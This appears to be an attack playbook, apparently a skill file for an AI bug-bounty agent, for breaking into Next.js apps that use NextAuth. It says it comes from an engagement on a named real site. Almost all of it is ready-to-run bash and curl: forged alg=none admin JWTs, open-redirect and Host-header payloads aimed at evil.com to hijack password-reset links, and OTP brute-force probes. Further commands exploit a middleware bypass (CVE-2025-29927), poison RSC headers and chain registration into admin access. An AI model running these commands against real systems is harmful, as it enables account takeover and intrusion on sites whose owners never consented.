# NextAuth.js Systematic Probe Playbook

Complete enumeration + exploitation playbook for Next.js apps using NextAuth (or a custom `/api/auth/*` auth). Derived from a real engagement on everlyn.ai. Covers the standard 12-probe checklist operators request when they say "AUTH & OAUTH AGENT".

## Quick triage (60 seconds)

Determine which auth flavor the target runs **before** deep testing — subsequent probes branch on this:

```bash
BASE=https://target.com
for ep in session providers csrf signin error signout; do
  echo "=== /api/auth/$ep ==="
  curl -4 -s -w "\n[%{http_code}] %{content_type}\n" "$BASE/api/auth/$ep" | head -5
done

for p in google github email credentials; do
  echo "=== /api/auth/callback/$p (GET) ==="
  curl -4 -s -w "\n[%{http_code}] %{redirect_url}\n" -o /dev/null "$BASE/api/auth/callback/$p"
done
```

## Decision matrix from response shape

| `/api/auth/session` | `/api/auth/csrf`     | `/api/auth/providers` | Diagnosis |
|---------------------|----------------------|-----------------------|-----------|
| 200 `{"user":{...}}`| 200 `{"csrfToken"}`  | 200 `{...}`           | **Default NextAuth v4** — full default attack surface below applies |
| 200 `{"user":{}}`   | 404                  | 404                   | **Custom session endpoint.** Not stock NextAuth. Manual JWT inspection only. |
| 200 `{}`            | 200 `{"csrfToken":""}`| 404                  | NextAuth present but no providers configured (custom callbacks only) |
| 401/403 everywhere  | 401/403              | 401/403               | Auth-behind-auth — middleware blocks. Skip to middleware bypass (i). |

## (a) Endpoint enumeration — record per-shape

For every endpoint, log: HTTP status, Content-Type, Set-Cookie presence, response body shape (compare to https://next-auth.js.org/getting-started/rest-api), `X-Auth-Return-Redirect` header, `Vary:` header.

## (b) JWT tampering

```bash
curl -4 -s -c cookies.txt $BASE/api/auth/session

# Identify cookie flavor
grep -iE "next-auth|authjs|__Secure" cookies.txt

TOKEN=$(grep -E "next-auth.session-token|authjs.session-token" cookies.txt | awk '{print $NF}')
DOT_COUNT=$(tr -cd '.' <<<"$TOKEN" | wc -c)

if [[ $DOT_COUNT -eq 2 ]]; then
  echo "3-part JWT (header.payload.sig) — alg=none attack viable"
  H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
  P=$(echo -n '{"sub":"1","email":"admin@target.com","role":"admin","iat":'$(date +%s)'}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
  curl -4 -s -H "Cookie: next-auth.session-token=$H.$P." $BASE/api/auth/session
elif [[ $DOT_COUNT -eq 4 ]]; then
  echo "5-part JWE — alg=none NOT applicable; try kid/jku injection claims (rarely works on v4)"
else
  echo "Opaque session token (database-backed) — no client-side attack; pivot to session fixation/theft"
fi
```

**Red flag claims — never assert without showing the response:**
- "alg=none works" → must show `/api/auth/session` returning admin email/role with forged cookie
- "empty-secret HMAC verify" → must attempt with `""` as secret AND show acceptance

## (c) OAuth callback confusion

```bash
curl -4 -s -i "$BASE/api/auth/callback/google?state=invalid"
curl -4 -s -i "$BASE/api/auth/callback/google?code=invalid"
curl -4 -s -i "$BASE/api/auth/callback/google?state=a&state=b"          # param pollution
curl -4 -s -i "$BASE/api/auth/callback/google?error=access_denied"
curl -4 -s -i "$BASE/api/auth/callback/google?state=%00"                # null byte
curl -4 -s -i "$BASE/api/auth/callback/google?state[]="                 # array coercion
```

Note whether response leaks: stack trace (500 → info disclose), provider list reveal, internal error detail, query params reflected in redirect (potential open redirect chain).

## (d) Open redirect via callbackUrl

```bash
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=https://evil.com"
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=//evil.com"
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=/%5cevil.com"
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=https://target.com.evil.com"
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=https://target.com\@evil.com"
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=https://evil.com\.target.com"
curl -4 -s -i "$BASE/api/auth/signin?callbackUrl=javascript:alert(1)"
curl -4 -s -i "$BASE/api/auth/signout?callbackUrl=https://evil.com"
```

Inspect `Location:` header on each. Vulnerable if external redirect passes through unmodified.

## (e) Host-header injection on password-reset / email trigger

```bash
for H in "evil.com" "target.com.evil.com" "evil.com/target.com"; do
  curl -4 -s -i -X POST "$BASE/api/auth/forgot-password" \
    -H "Host: $H" -H "X-Forwarded-Host: $H" -d "email=test@test.com"
done
# Forwarded variants alone
curl -4 -s -i -X POST "$BASE/api/auth/forgot-password" \
  -H "X-Forwarded-Host: evil.com" -d "email=test@test.com"
curl -4 -s -i -X POST "$BASE/api/auth/forgot-password" \
  -H "X-Original-Host: evil.com" -d "email=test@test.com"
```

Capture any self-triggered reset email. If the link in it contains `evil.com` host → **CRITICAL** account takeover. Also check `/api/auth/signin/email` (NextAuth magic link) — same test.

## (f) Email OTP endpoints

```bash
ROUTES=(
  "/api/auth/send-code" "/api/auth/verify-code"
  "/api/auth/signin/email"
  "/api/auth/register/send-code" "/api/auth/register/verify-code"
  "/api/otp/send" "/api/otp/verify"
  "/api/verify-email" "/api/send-verification"
)
for r in "${ROUTES[@]}"; do
  echo "=== $r ==="
  curl -4 -s -w "\n[%{http_code}]\n" -X POST "$BASE$r" \
    -H "Content-Type: application/json" -d '{"email":"test@test.com"}'
done

# Rate limit — 5 rapid
for i in {1..5}; do
  curl -4 -s -w "[$i %{http_code}] " -o /dev/null -X POST "$BASE/api/auth/send-code" \
    -d '{"email":"test@test.com"}'
done; echo

# Boundary + null code probes
for code in 000000 999999 123456 "" null 0000000; do
  curl -4 -s -w "[$code %{http_code}] " -o /dev/null -X POST "$BASE/api/auth/verify-code" \
    -d "{\"email\":\"test@test.com\",\"code\":\"$code\"}"
done; echo
```

Signals:
- All 5 rapid sends return 200 → no rate limit. 6-digit brute = 10⁶ attempts (record feasibility with measured response time).
- 429 on attempt 5 → rate-limited. Identify window (60s? 300s?) and per-email vs per-IP.
- 000000 accepted → never trust hardcoded defaults.
- `null` / empty returns 200 → input validation missing.

## (g) Locale bypass

```bash
for locale in en zh ja ko de fr es pt ru ar; do
  curl -4 -s -w "/$locale/admin [%{http_code}] → %{redirect_url}\n" \
    -o /dev/null "$BASE/$locale/admin"
done
```

If `/en/admin` → 307/302 to `/en/login` but `/zh/admin` → 200 or to a different destination → locale-gated auth bypass.

## (h) Direct /api/admin/* probes

```bash
for r in /api/admin/users /api/admin/orders /api/admin/refund /api/admin/waitlist \
         /api/admin/settings /api/admin/analytics /api/admin/logs /api/admin/stats \
         /api/admin/audit /api/admin/roles; do
  echo "=== $r ==="
  curl -4 -s -w "\n[%{http_code}]\n" "$BASE$r" | head -c 500
done
```

Status code taxonomy:
- **401** — unauthenticated. Try with stolen/forged session cookie.
- **403** — authenticated but insufficient role. Try role claim modification in JWT (b).
- **404** — doesn't exist (or 404-masked-403). Differentiate by hitting a definitely-real admin route first.
- **200 + JSON** — gold. Record body.

## (i) x-middleware-subrequest bypass (CVE-2025-29927)

```bash
# Single value form
curl -4 -s -i "$BASE/admin" -H "x-middleware-subrequest: 1"

# Multi-value (recursive middleware collapse)
curl -4 -s -i "$BASE/admin" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

# Affects: Next 11.1.4 – 15.2.2 (patched 13.5.9 / 14.2.25 / 15.2.3)
```

If response differs (returns admin body instead of redirect) → middleware bypass active.

## (j) RSC payload poisoning (Next-Router-State-Tree)

```bash
# Crafted state-tree forces server-side render as RSC navigation
curl -4 -s -i "$BASE/admin" \
  -H "RSC: 1" \
  -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
  -H "Next-Url: /admin"
```

If server returns RSC payload (`0:["$"...` lines) instead of HTML redirect, or returns payload containing leaked data → check contents carefully. RSC payloads often dump more than HTML rendering would.

## (k) Grep JS chunks for auth routes

After downloading all chunks (see references/bundle-analysis.md in bug-bounty-agent):

```bash
grep -rhoE '"/api/[a-zA-Z/_-]+"' chunks/ | sort -u
grep -rhoE '"/api/auth/[a-zA-Z/_-]+"' chunks/ | sort -u
grep -rhoE 'api/auth' chunks/ | sort -u | head -20
```

## (l) Register → auto-login → /admin proof

The CRITICAL deliverable chain. Document all 4 steps:

```bash
TS=$(date +%s)
EMAIL="pentest${TS}@wearehackerone.com"
PASS="TestPass123!${TS}"

# 1. Register (route discovered from chunks)
curl -4 -s -c cookies.txt -X POST "$BASE/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\",\"name\":\"Pentest\"}" \
  -w "\n[register: %{http_code}]\n"

# 2. Extract session cookie
grep -iE "session|token" cookies.txt

# 3. IMMEDIATELY GET /admin with cookie
curl -4 -s -b cookies.txt -w "\n[/admin: %{http_code}]\n" "$BASE/admin" | head -c 2000

# 4. Also try /api/auth/session with same cookies
curl -4 -s -b cookies.txt "$BASE/api/auth/session"
```

**Proof deliverable:** full `Set-Cookie` header + `/admin` response body snippet showing dashboard content (not just 200 status).

## Sign-off checklist

- [ ] All 12 letters (a–l) tested with actual tool output
- [ ] Every claim backed by curl response, not inference
- [ ] Cookie values captured and quoted (not just "cookie exists")
- [ ] Exact status codes recorded (not "blocked" / "maybe works")
- [ ] Failed attacks documented with rationale (why failed, what this tells us)

## See also

- `bug-bounty-agent/SKILL.md` — parent umbrella methodology, pre-audit gate, never-capitulate rule
- `references/nextauth-admin-takeover.md` (bug-bounty-agent) — Everlyn chain for takeover pivot
- `references/verification-and-poc.md` (bug-bounty-agent) — PoC quality bar
